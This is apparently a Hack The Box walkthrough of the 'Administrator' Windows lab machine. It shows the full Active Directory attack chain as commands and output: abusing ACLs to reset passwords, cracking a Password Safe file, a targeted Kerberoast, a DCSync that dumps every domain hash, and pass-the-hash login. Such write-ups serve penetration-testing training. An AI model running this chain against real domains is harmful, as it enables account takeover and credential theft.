 # Target
| Category       | Details                                                                                                                                                                            |
|----------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 📝 Name        | [Administrator](https://app.hackthebox.com/machines/Administrator)                                                                                                                 |
| 🏷 Type        | HTB Machine                                                                                                                                                                        |
| 🖥️ OS         | Windows                                                                                                                                                                            |
| 🎯 Difficulty  | Medium                                                                                                                                                                             |
| 💡 Information | As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: <br> Username: `Olivia` <br> Password: `ichliebedich` |

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ nmap -sS -sC -sV $TARGET
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-18 18:17 CEST
Nmap scan report for 10.129.219.132
Host is up (0.031s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 23:18:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/18%Time=68027B1B%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-18T23:18:59
|_  start_date: N/A
|_clock-skew: 7h01m20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.83 seconds
```

# Privileges escalation
Scan shows 'typical' set of Windows services running on target, we can also see that FTP server is operational and that domain controller is running at `administrator.htb`, so let's start with adding this domain to our `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ echo "$TARGET administrator.htb" | sudo tee -a /etc/hosts
10.129.219.132 administrator.htb
```

We were provided with initial credentials `Olivia:ichliebedich`, let's use them to lookup abusable paths to `Administrator`, with help of Bloodhound.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ ~/Tools/BloodHound.py/bloodhound.py -d administrator.htb -c DCOnly -u Olivia -p ichliebedich -ns $TARGET -k
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 computers
INFO: Found 0 trusts
INFO: Done in 00M 03S
```

With data collected, let's start Bloodhound (I'm using docker) and upload what we have gathered.
```
┌──(magicrc㉿perun)-[~/attack]/HTB Administrator]
└─$ curl -L https://ghst.ly/getbhce > docker-compose.yml && \
sudo docker compose up
```

We were able to identify two paths. In the 1st we can escalate from `Oliva` to `Benjamin` through `Michael`. 

![Oliva->Benjamin](images/oliva_benjamin.png)

We will exploit this path with following steps:
- Change `Michael` password with `Olivia` having `GenericAll`. We also see that `Michael` is member of `Remote Management Users`.
- Change `Benjamin` password with `Michael` having `ForceChangePassword`.

In the 2nd the path we can escalate from `Emily` to `Administrator` through `Ethan`.

![Emily->Ethan->Administrator](images/emily_ethan_admin.png)

We will exploit this path with following steps:
- Add shadow credentials to `Ethan` with `Emily` having `GenericWrite`.
- Use DCSync attack to steal `Administrator` NLTM hash with `Ethan` having `DCSync`

There is however gap between `Benjamin` and `Emily`, but we will see what other options we have after 1st escalation. Let's start with passwords updates.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ net rpc password Michael MichaelPass123 -U administrator.htb/Olivia%ichliebedich -S administrator.htb && \
net rpc password Benjamin BenjaminPass123 -U administrator.htb/Michael%MichaelPass123 -S administrator.htb
```

Further target enumeration using `Michael` remote management access did not yield any interesting results. We do not have such possibility with `Benjamin`, but there is FTP server running on target. Let's check our brand-new credentials against it.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ ftp ftp://Benjamin:BenjaminPass123@administrator.htb
Connected to administrator.htb.
220 Microsoft FTP Service
331 Password required
230 User logged in.
Remote system type is Windows_NT.
200 Type set to I.
ftp> ls
229 Entering Extended Passive Mode (|||53412|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
```

We were able to gain access to FTP and what is more we have found `Backup.psafe3` file which is an encrypted password database used by Password Safe (password manager). Let's exfiltrate it and try to open it locally.

![Encrypted Password Safe](images/psafe_encrypted.png)

We can see that safe combination is needed, let's try to break it with `hashcat`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ hashcat -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt --quiet
Backup.psafe3:tekieromucho
```

With combination broken let's use to see the content of safe.

![Decrypted Password Safe](images/psafe_decrypted.png)

We can see that among discovered credentials that there is `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`. This closes gap between 1st and 2nd escalation path. Let's check if `Emily` hides user flag and continue with escalation to `Administrator`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ evil-winrm -i administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> ls ..\Desktop\user.txt


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/18/2025   4:08 PM             34 user.txt
```

User flag captured! Let's begin 2nd phase of escalation, starting with adding shadow credentials to `Ethan`
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ python3 ~/Tools/pywhisker/pywhisker/pywhisker.py -d administrator.htb -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --target Ethan --action add
[*] Searching for the target account
[*] Target user found: CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5c0be1b3-81d8-ca22-58c9-331831b256d5
[*] Updating the msDS-KeyCredentialLink attribute of Ethan
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: tEJtxZSZ.pfx
[+] PFX exportiert nach: tEJtxZSZ.pfx
[i] Passwort für PFX: SDXfnsnKXS8GT2tj28xr
[+] Saved PFX (#PKCS12) certificate & key at path: tEJtxZSZ.pfx
[*] Must be used with password: SDXfnsnKXS8GT2tj28xr
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

And use it to obtain NTLM hash.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ certipy-ad cert -export -pfx tEJtxZSZ.pfx -password SDXfnsnKXS8GT2tj28xr -out Ethan.pfx && \
certipy-ad auth -pfx Ethan.pfx -username Ethan -domain administrator.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'Ethan.pfx'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ethan@administrator.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

Unfortunately due to Kerberos error we are not able to use this path. However, with `GenericWrite` over `Ethan` we could try `Targeted Kerberoast` attack.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ ~/Tools/targetedKerberoast/targetedKerberoast.py -d administrator.htb --request-user Ethan -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
[*] Starting kerberoast attacks
[*] Attacking user (Ethan)
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

But first we need to fix clock skew.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ sudo timedatectl set-ntp off && \
sudo rdate -n administrator.htb
```

And after rerunning `Targeted Kerberoast` attack.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ ~/Tools/targetedKerberoast/targetedKerberoast.py -d administrator.htb --request-user Ethan -u Emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -o ethan.hash && \
cat ethan.hash
[*] Starting kerberoast attacks
[*] Attacking user (Ethan)
[+] Writing hash to file for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$2628b2e3117ab63e109fb5b5e0fc434d$8706ebb2293dd0ad89093926fe60ae2e7d331458252caa69e17b2ef6aefbb93cdc8f231ab0b33be2456d2f0eb51766ce1f148b6e1b00806e181118eda5bf47164cf07fde82fe30e93578bcaea0c5d7a26ff6b7ab13e8bab41a145bccc917646dd9a61de69e1c062e84b9f42d15e2bc24ee003ea27e8e30ccef661e92f58005c9f148d017887964d1fb17f8367c228b148e8548a68aa03bd12f552d374b228de4fa3c792d8e8940dc4fe2d5470cc7dfc908392cdd4889e990ef7538e5a752ea9e90000341d460c64250d43252f0e15eef3ed0233ce177eb5042de762ed0f7886f9ab62d7e44e12b6a11f4b3633f6adcdfde7d5e821a5029964ac84fe6264d17e476aa1d3c8a20500e9141d3c75bf40efecc1e5c250b49ea0d6e9d8519d68310385154cbcb46c60d6833894d82d870a52adfb2fd8ff561aa412e9dc242510a2b2ab190c87080a3849387f8a00ba2c3a25b4b3152b93fd0cd0b67cafcb1cc4b2f3cf7366cd39f946c310bb3010adba8f78b20fa387e741ebce77a99aa75204cd344e62548461b6d224483022e5e07897f6da3e203d923b101892c98811ce5740e46139b91ea5a862eb705b4fba4c414f654d5a179fb019ff26ce43a3ebbb13023a6bbe7a5231f7306a53b557c93b6edf6ad161608871fa36c43011edf7969ab6c43ad54674e63b1b7f09eac146bd3383d019fd6c3b913cec8fee4e879d7c113cc5553911f01a3a67efb7445d6b824e746c5c23e88aa64feb1c0e862ae1bb4b4555f948696b4056817367d88b9b1e33694d9012fc94b359e0e49d271758eec4bdacaaabaf2a19d0b5799779821c024d98f0186df42083005eaf14ac5e6ab6b754d360d2663fc45c66cf91e907304b27376afb86730aaba0f3465df64f2a7f8eb4bc388b02a76b77d2e238b6eb6ef1c472a9468b9cb14d279be6aa4c88defa6168c7b5fac6cd5d60aa4b8b80d3937b6f122d5d32099f9b8895a7f9cd5d70421e6a2d1e1d70409dd607e28bdd334092e8ae933550681d1cfe8d7026f60204083f31ed8a141f4bd54160f1bfc42632f1d2ca6d9bba3e4bbf865c3b27921baff80c2fc73eee9dc6e01bf4843fe0653a37d84d20de50e30a7e3b52cf6cd1e2fccfeb57d82eac326b89d63a62ca3b2085048a4fee3537d876a8a53e9ae38f3b8c3d75b48ac3a863682b6b919a7bf4de4156f6f24c9a9836e8b585c23b522c17aa2b6afc66720e57bee35617b1a5eb055858d19a473cfeddd640052dd9cc037a31e62c94319d201ddeacce6535082433bbb9f13631ba873f1057e4a7aa154a6046d958b365cca0c9bf016074d12b8430c329a083e3def7aef53ffe74efeb1a9671061a73e8267498351c4b858c472e23a03e745bf6372cd9a78c6e3fbe0bba8d1f759dc7bfadf8757bb338ae51f457b7d688bc92faead49015a345edc0968a6095b7a9e79bf13ff49981ac8e6ded3404b5e68ec06223262e24a6dbe6e9de3ac9f7b3306105f4137214df31b91276f61255ad9cae969273c0aef0ce1e305955af885103cc5
```

We were finally able to obtain hash for `Ethan`, it's Kerberos and not NTLM, so we still need to break it with `hashcat` 
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt --quiet
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$2628b2e3117ab63e109fb5b5e0fc434d$8706ebb2293dd0ad89093926fe60ae2e7d331458252caa69e17b2ef6aefbb93cdc8f231ab0b33be2456d2f0eb51766ce1f148b6e1b00806e181118eda5bf47164cf07fde82fe30e93578bcaea0c5d7a26ff6b7ab13e8bab41a145bccc917646dd9a61de69e1c062e84b9f42d15e2bc24ee003ea27e8e30ccef661e92f58005c9f148d017887964d1fb17f8367c228b148e8548a68aa03bd12f552d374b228de4fa3c792d8e8940dc4fe2d5470cc7dfc908392cdd4889e990ef7538e5a752ea9e90000341d460c64250d43252f0e15eef3ed0233ce177eb5042de762ed0f7886f9ab62d7e44e12b6a11f4b3633f6adcdfde7d5e821a5029964ac84fe6264d17e476aa1d3c8a20500e9141d3c75bf40efecc1e5c250b49ea0d6e9d8519d68310385154cbcb46c60d6833894d82d870a52adfb2fd8ff561aa412e9dc242510a2b2ab190c87080a3849387f8a00ba2c3a25b4b3152b93fd0cd0b67cafcb1cc4b2f3cf7366cd39f946c310bb3010adba8f78b20fa387e741ebce77a99aa75204cd344e62548461b6d224483022e5e07897f6da3e203d923b101892c98811ce5740e46139b91ea5a862eb705b4fba4c414f654d5a179fb019ff26ce43a3ebbb13023a6bbe7a5231f7306a53b557c93b6edf6ad161608871fa36c43011edf7969ab6c43ad54674e63b1b7f09eac146bd3383d019fd6c3b913cec8fee4e879d7c113cc5553911f01a3a67efb7445d6b824e746c5c23e88aa64feb1c0e862ae1bb4b4555f948696b4056817367d88b9b1e33694d9012fc94b359e0e49d271758eec4bdacaaabaf2a19d0b5799779821c024d98f0186df42083005eaf14ac5e6ab6b754d360d2663fc45c66cf91e907304b27376afb86730aaba0f3465df64f2a7f8eb4bc388b02a76b77d2e238b6eb6ef1c472a9468b9cb14d279be6aa4c88defa6168c7b5fac6cd5d60aa4b8b80d3937b6f122d5d32099f9b8895a7f9cd5d70421e6a2d1e1d70409dd607e28bdd334092e8ae933550681d1cfe8d7026f60204083f31ed8a141f4bd54160f1bfc42632f1d2ca6d9bba3e4bbf865c3b27921baff80c2fc73eee9dc6e01bf4843fe0653a37d84d20de50e30a7e3b52cf6cd1e2fccfeb57d82eac326b89d63a62ca3b2085048a4fee3537d876a8a53e9ae38f3b8c3d75b48ac3a863682b6b919a7bf4de4156f6f24c9a9836e8b585c23b522c17aa2b6afc66720e57bee35617b1a5eb055858d19a473cfeddd640052dd9cc037a31e62c94319d201ddeacce6535082433bbb9f13631ba873f1057e4a7aa154a6046d958b365cca0c9bf016074d12b8430c329a083e3def7aef53ffe74efeb1a9671061a73e8267498351c4b858c472e23a03e745bf6372cd9a78c6e3fbe0bba8d1f759dc7bfadf8757bb338ae51f457b7d688bc92faead49015a345edc0968a6095b7a9e79bf13ff49981ac8e6ded3404b5e68ec06223262e24a6dbe6e9de3ac9f7b3306105f4137214df31b91276f61255ad9cae969273c0aef0ce1e305955af885103cc5:limpbizkit
```

With `Ethan:limpbizkit` credentials obtained, last step will be `DCSync` attack to obtain `Administrator` NTLM hash.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ impacket-secretsdump -just-dc administrator.htb/Ethan:limpbizkit@administrator.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:f015ec93ac7c4de42fa298361a45b95a:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:7bfa305745b9dd42fa451edef06a1f1c:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:eeae61dc06cbb9c2b67f8a712340597cd2a7669290860c6ebfc6b36ca1e2ac76
administrator.htb\michael:aes128-cts-hmac-sha1-96:6b3538016efceaaddbae5ce4a083c048
administrator.htb\michael:des-cbc-md5:a28315323e731fc1
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:d0924c14b39a9fc024be358587d3d5d913a7d8259885da9917a695e253161f8c
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:315d2a04549bd81daec631c3ee1452b4
administrator.htb\benjamin:des-cbc-md5:2592ae85f4b5a849
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up...
```

Now we can grab `Administrator` flag and conclude this challenge.
```
┌──(magicrc㉿perun)-[~/attack/HTB Administrator]
└─$ evil-winrm -i administrator.htb -u Administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..\Desktop\root.txt


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         4/18/2025   4:08 PM             34 root.txt
```
